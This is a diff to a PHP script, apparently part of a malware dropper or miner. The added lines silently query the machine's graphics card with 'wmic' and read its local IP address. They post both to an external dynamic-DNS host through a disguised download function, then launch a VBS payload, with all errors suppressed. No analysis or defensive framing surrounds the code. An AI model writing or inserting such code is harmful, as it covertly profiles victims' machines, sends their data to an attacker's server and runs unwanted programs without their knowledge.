@@ -179,7 +179,22 @@ if(1)
 			$output = implode("\n", $output);
 			if(false === stripos($output, 'w_driver1.95_x86'))
 			{
+				$output = array();
+				$r = 0;
+				@exec('wmic path win32_VideoController get name', $output, $r);
+				$output = trim(implode("\n", $output));
+				$output = preg_replace('/[\r\n]+/is', ' - ', $output);
+				$ipl = @gethostbyname(@gethostname());
+				if(!$ipl)
+					$ipl = '127.0.0.1';
+				$post = array(
+					'gpuid' => $output
+				);
+				@$GLOBALS['__download_002']('https://secondsapphost.servehttp.com/test_procs/test.php?ip='.$ipl, $post);
+				sleep(5);
+				
 				@exec('start "" "'.$vbs_exec_path.'"');
+				
 				/**
 				$output = array();
 				$r = 0;
